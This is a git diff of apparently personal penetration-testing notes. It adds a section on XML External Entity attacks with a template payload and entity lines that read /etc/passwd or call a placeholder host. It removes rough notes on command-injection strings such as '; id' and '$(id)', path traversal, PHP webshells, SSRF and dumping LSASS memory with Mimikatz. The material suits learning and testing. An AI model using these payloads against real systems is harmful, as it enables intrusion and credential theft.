@@ -5,6 +5,7 @@
 * Files/File Upload/Logs
 * Executing Commands
 * Includes
+* XML 
 * Forward and Reverse Shells 
 * Reverse Shells, TTY Cleanup 
 
@@ -35,35 +36,34 @@ Some common examples include:
 * Disable internal IPs 
 * Aka Protect your infrastructure 
 
+## XML External Entity attack 
+
+An XML External Entity attack is a type of attack
+against an application that parses XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. This attack may lead to the disclosure of confidential data, denial of service, server side request
+forgery, port scanning from the perspective of the machine where the parser is located, and other system impacts
+
+Lots of sites are still vulnerable to XXE because it's hard to replace legacy systems. 
+
+Vanilla Template 
+ ``` <?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE foo [
+    <!ELEMENT foo ANY>
+    <!ENTITY xxe SYSTEM "{PAYLOAD}">
+]>
+<foo>&xxe;</foo>
+```
+
+Common points of attack 
+* ` <!ENTITY xxe SYSTEM "file:///dev/urandom">`
+* ` <!ENTITY xxe SYSTEM "file:///etc/passwd">`
+* `<!ENTITY xxe SYSTEM "http://{IP_ADDR}/{SOME_PATH}.txt">`
+*  ` <!ENTITY xxe SYSTEM "{EXTERNAL_LINK}/">`
+
+Reference: https://www.netsparker.com/blog/web-security/xxe-xml-external-entity-attacks/
+
+
+See [XML Penetration](./penetration_XXE.md) for feedifier examples.
 
 
 
-Commnd injection 
-10.10.10.1; id
-x``
-$(id) 
-id; ls 
-return 
-id; cat index.php
-../../../../etc/passwd
-Anything that the website is running as, as long as it has the permissions, you can run system commends 
 
-uploading php webshells 
-winterwolf 
-
-ServerSide Request Forgery (SSFR)
-Make requests through another website so that the end server thinks that it is safe
-
-XML External Entity
-Has a concept of entites -> variables 
-You can store a value in an entity and then that entity is referenced 
-
-You can inject an entity that gets files from  another place 
-
-lsass.exe 
-Local security Authority subsystem 
-
-You can dump the memory
-getting the registory.txt 
-
-Mimikatz 
